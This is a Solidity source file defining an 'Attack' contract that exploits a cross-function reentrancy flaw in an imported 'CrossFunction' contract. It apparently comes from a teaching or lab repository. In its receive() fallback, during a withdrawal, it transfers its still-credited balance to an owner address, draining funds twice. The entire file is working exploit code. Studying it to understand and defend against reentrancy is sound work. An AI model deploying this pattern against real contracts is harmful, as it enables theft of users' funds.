// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;
import {CrossFunction} from "./CrossFunction.sol";

contract Attack {
    CrossFunction crossFunction;
    address owner;

    constructor(CrossFunction _crossFunction, address _owner) {
        crossFunction = _crossFunction;
        owner = _owner;
    }

    function deposit() payable external {
        crossFunction.deposit{value: msg.value}();
    }

    function withdraw() external {
        uint256 crossFunctionBalance = crossFunction.getBalance(address(this));
        crossFunction.withdraw(crossFunctionBalance);
    }

    receive() payable external {
        uint256 balance = crossFunction.getBalance(address(this));
        crossFunction.transfer(owner, balance);
     }
}